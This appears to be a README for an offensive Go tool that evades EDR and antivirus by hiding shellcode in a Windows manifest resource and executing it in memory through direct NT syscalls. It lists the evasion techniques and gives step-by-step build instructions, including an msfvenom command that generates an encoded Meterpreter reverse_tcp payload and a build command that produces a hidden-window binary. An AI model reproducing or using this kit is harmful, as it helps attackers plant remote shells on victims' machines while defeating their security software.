# Bypass EDR / AV 

## Summary
This code loads shellcode embedded within the application’s resources, decodes it, and executes it directly in memory by leveraging Windows API calls. Functions and variables are configured to handle memory structures and permissions, enabling it to create a thread and execute the shellcode.

## Techniques Used

1- Loading and Extracting Resources: It uses FindResourceW and LoadResource functions to locate and load resources embedded within the binary. The function ReturnShellcode() leverages MAKEINTRESOURCE to access a type 24 resource (specific to Windows) and extract the shellcode contained between delimiters (#! and $!).

2- Shellcode Decoding: Once the resource is extracted, the shellcode is decoded from hexadecimal into bytes for execution.

3- Hash Obfuscation: The hash function applies obfuscation by XOR-ing strings with a specific key (0xde, 0xad, 0xbe, 0xef). It then calculates an SHA-1 hash, and the first 16 characters of the result serve as a system call identifier (syscall ID).

4- Memory Allocation and Permission Configuration: The code utilizes Windows API calls to allocate executable memory (with read, write, and execute permissions) for the shellcode (MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE) and The NtAllocateVirtualMemory method reserves a block of memory with executable permissions for storing the shellcode.

5- Writing and Executing Shellcode in Memory: NtWriteVirtualMemory is used to copy the shellcode into the allocated memory region and A new thread is created with NtCreateThreadEx, pointing to the memory block containing the shellcode.

6- Execution Wait: NtWaitForSingleObject is used to wait indefinitely for the shellcode to execute in the new thread.

We will use a technique of exploiting the manifest files using the RSRC tool.
What is a manifest file? --> It is an XML file that provides information. We will take advantage of this file to leave our shellcode.

## Instructions
Create shellcode --> msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=eth0 lport=4444 EnableStageEncoding=true StageEncoder=x64/xor_dynamic EXITFUNC=thread -f hex

Install 2 libraries : go get "golang.org/x/sys/windows" and go get "github.com/ASP4RUX/Hades/pkg/Hades"

Install RSRC --> go install github.com/akavel/rsrc@latest

Modify manifest.txt file using hex-encoded shellcode inside the characters (#!) and ($!).

RSRC --> rsrc -manifest manifiesto.txt

Compile --> go build -ldflags="-H=windowsgui -s -w"

![imagen](https://github.com/user-attachments/assets/467a3913-0a1a-4022-b40f-a1d0fccc62bf)

